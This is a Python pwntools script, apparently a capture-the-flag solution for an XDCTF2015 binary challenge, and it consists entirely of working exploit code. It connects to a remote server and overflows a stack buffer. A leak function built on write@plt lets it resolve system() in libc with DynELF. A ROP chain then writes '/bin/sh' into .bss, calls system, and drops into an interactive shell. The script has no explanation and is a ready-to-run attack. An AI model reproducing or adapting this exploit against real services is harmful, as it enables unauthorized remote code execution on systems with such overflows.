from pwn import *

#a=process("./pwn")
a=remote("111.198.29.45","30260")
elf=ELF("./pwn")
start_addr=0x080483D0
write_plt=elf.plt["write"]

def leak(addr):
	payload='A'*112
	payload+=p32(write_plt)
	payload+=p32(start_addr)
	payload+=p32(1)
	payload+=p32(addr)
	payload+=p32(4)
	a.recvuntil("Welcome to XDCTF2015~!\n")
	a.sendline(payload)
	data=a.recv(4)
	return data

d=DynELF(leak,elf=elf)
system_addr=d.lookup("system","libc")
read_plt=elf.plt["read"]

payload='A'*112
payload+=p32(read_plt)
payload+=p32(0x080485cd) #pop3_ret
payload+=p32(0)
payload+=p32(elf.bss())
payload+=p32(10)
payload+=p32(system_addr)
payload+=p32(0x080485cd)
payload+=p32(elf.bss())
a.sendline(payload)
sleep(0.1)
a.sendline("/bin/sh\x00")
a.interactive()

